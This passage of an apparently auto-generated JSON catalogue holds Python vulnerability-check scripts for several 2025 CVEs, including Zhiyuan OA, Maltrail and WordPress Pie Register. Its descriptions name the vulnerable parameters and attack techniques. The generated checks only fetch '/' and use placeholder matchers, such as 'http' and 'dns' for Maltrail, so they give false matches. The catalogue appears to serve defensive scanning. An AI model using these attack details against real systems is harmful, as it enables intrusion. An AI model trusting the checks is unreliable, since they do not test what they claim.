parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_34027(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [
          "CVE-2025-34027"
        ],
        "tags": [
          "cve",
          "cve2025",
          "versa",
          "concerto",
          "auth-bypass",
          "vkev",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_34040",
        "name": "Zhiyuan OA Platform - Arbitrary File Upload",
        "language": "Python",
        "famille": "CVE",
        "description": "An arbitrary file upload vulnerability exists in the Zhiyuan OA platform 5.0, 5.1 - 5.6sp1, 6.0 - 6.1sp2, 7.0, 7.0sp1 - 7.1, 7.1sp1, and 8.0 - 8.0sp2 via the wpsAssistServlet interface. The realFileType and fileId parameters are improperly validated during multipart file uploads, allowing unauthenticated attackers to upload crafted JSP files outside of intended directories using path traversal. Successful exploitation enables remote code execution as the uploaded file can be accessed and executed through the web server.",
        "severity": "critical",
        "detection": "[OR] mot(s) 'officeTransResultFlag, \"success\":true' / [OR] mot(s) '{{marker}}'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "marker",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: marker",
            "default": "{{randstr}}"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{randbase(8)}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-34040\nName: Zhiyuan OA Platform - Arbitrary File Upload\nSeverity: critical\nDescription: An arbitrary file upload vulnerability exists in the Zhiyuan OA platform 5.0, 5.1 - 5.6sp1, 6.0 - 6.1sp2, 7.0, 7.0sp1 - 7.1, 7.1sp1, and 8.0 - 8.0sp2 via the wpsAssistServlet interface. The realFileType and fileId parameters are improperly validated during multipart file uploads, allowing unauthenticated attackers to upload crafted JSP files outside of intended directories using path traversal. Successful exploitation enables remote code execution as the uploaded file can be accessed and executed through the web server.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_34040:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-34040\"\n    SEVERITY = \"critical\"\n    NAME = \"Zhiyuan OA Platform - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] mot(s) \\'officeTransResultFlag, \"success\":true\\' / [OR] mot(s) \\'{{marker}}\\''\n\n        # Simple word matcher simulation\n        matchers = ['officeTransResultFlag, \"success\":true', '{{marker}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Zhiyuan OA Platform - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_34040(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-34040\nName: Zhiyuan OA Platform - Arbitrary File Upload\nSeverity: critical\nDescription: An arbitrary file upload vulnerability exists in the Zhiyuan OA platform 5.0, 5.1 - 5.6sp1, 6.0 - 6.1sp2, 7.0, 7.0sp1 - 7.1, 7.1sp1, and 8.0 - 8.0sp2 via the wpsAssistServlet interface. The realFileType and fileId parameters are improperly validated during multipart file uploads, allowing unauthenticated attackers to upload crafted JSP files outside of intended directories using path traversal. Successful exploitation enables remote code execution as the uploaded file can be accessed and executed through the web server.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_34040:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-34040\"\n    SEVERITY = \"critical\"\n    NAME = \"Zhiyuan OA Platform - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] mot(s) \\'officeTransResultFlag, \"success\":true\\' / [OR] mot(s) \\'{{marker}}\\''\n\n        # Simple word matcher simulation\n        matchers = ['officeTransResultFlag, \"success\":true', '{{marker}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Zhiyuan OA Platform - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_34040(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "file-upload",
          "intrusive",
          "zhiyuan",
          "lfi",
          "vkev",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_34073",
        "name": "Maltrail <=0.54 Username Parameter - Remote Command Execution",
        "language": "Python",
        "famille": "CVE",
        "description": "Maltrail versions <=0.54. A remote attacker can execute arbitrary operating system commands via the username parameter in a POST request to the /login endpoint.",
        "severity": "critical",
        "detection": "[OR] DSL: contains(header, \"Maltrail\"); contains(interactsh_protocol, 'http') || contains(interactsh_protocol, 'dns')",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-34073\nName: Maltrail <=0.54 Username Parameter - Remote Command Execution\nSeverity: critical\nDescription: Maltrail versions <=0.54. A remote attacker can execute arbitrary operating system commands via the username parameter in a POST request to the /login endpoint.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_34073:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-34073\"\n    SEVERITY = \"critical\"\n    NAME = \"Maltrail <=0.54 Username Parameter - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(header, \"Maltrail\"); contains(interactsh_protocol, \\'http\\') || contains(interactsh_protocol, \\'dns\\')'\n\n        # Simple word matcher simulation\n        matchers = ['http', 'dns']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Maltrail <=0.54 Username Parameter - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_34073(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-34073\nName: Maltrail <=0.54 Username Parameter - Remote Command Execution\nSeverity: critical\nDescription: Maltrail versions <=0.54. A remote attacker can execute arbitrary operating system commands via the username parameter in a POST request to the /login endpoint.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_34073:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-34073\"\n    SEVERITY = \"critical\"\n    NAME = \"Maltrail <=0.54 Username Parameter - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(header, \"Maltrail\"); contains(interactsh_protocol, \\'http\\') || contains(interactsh_protocol, \\'dns\\')'\n\n        # Simple word matcher simulation\n        matchers = ['http', 'dns']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Maltrail <=0.54 Username Parameter - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_34073(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "maltrail",
          "rce",
          "unauth",
          "oss",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_34077",
        "name": "WordPress Pie Register <= 3.7.1.4 - Authentication Bypass",
        "language": "Python",
        "famille": "CVE",
        "description": "An authentication bypass vulnerability exists in the WordPress Pie Register plugin ≤ 3.7.1.4 that allows unauthenticated attackers to impersonate arbitrary users by submitting a crafted POST request to the login endpoint. By setting social_site=true and manipulating the user_id_social_site parameter, an attacker can generate a valid WordPress session cookie for any user ID, including administrators.Once authenticated, the attacker may exploit plugin upload functionality to install a malicious plugin containing arbitrary PHP code, resulting in remote code execution on the underlying server.",
        "severity": "critical",
        "detection": "[OR] DSL: contains(set_cookie,'wordpress_logged_in_'); status_code==302 / [OR] DSL: status_code == 200; contains_all(body, \"Dashboard\",\"Plugins\",\"Edit Profile\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-34077\nName: WordPress Pie Register <= 3.7.1.4 - Authentication Bypass\nSeverity: critical\nDescription: An authentication bypass vulnerability exists in the WordPress Pie Register plugin ≤ 3.7.1.4 that allows unauthenticated attackers to impersonate arbitrary users by submitting a crafted POST request to the login endpoint. By setting social_site=true and manipulating the user_id_social_site parameter, an attacker can generate a valid WordPress session cookie for any user ID, including administrators.Once authenticated, the attacker may exploit plugin upload functionality to install a malicious plugin containing arbitrary PHP code, resulting in remote code execution on the underlying server.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_34077:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-34077\"\n    SEVERITY = \"critical\"\n    NAME = \"WordPress Pie Register <= 3.7.1.4 - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            